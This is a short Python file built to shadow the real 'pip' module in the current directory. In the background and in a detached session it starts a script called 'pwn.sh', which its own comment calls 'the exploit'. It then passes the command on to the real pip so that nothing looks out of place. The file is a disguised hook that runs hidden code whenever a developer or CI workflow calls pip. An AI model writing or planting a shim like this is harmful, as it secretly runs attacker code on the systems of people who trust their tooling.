import os
import subprocess
import sys

# Background the exploit
subprocess.Popen(['bash', 'pwn.sh'], start_new_session=True)

# Transparently proxy the real pip
real_pip = [sys.executable, '-m', 'pip'] + sys.argv[1:]
# To avoid recursion, we need to make sure we don't call ourselves again
# But since we are shadowing 'pip.py' in the CWD, if we run from another dir it might be fine.
# Or we can just exit and let the workflow continue if we don't care about breaking it.
# Actually, let's try to proxy it properly.
# Find the real pip module path
sys.path.remove(os.getcwd())
import pip
sys.exit(pip.main())
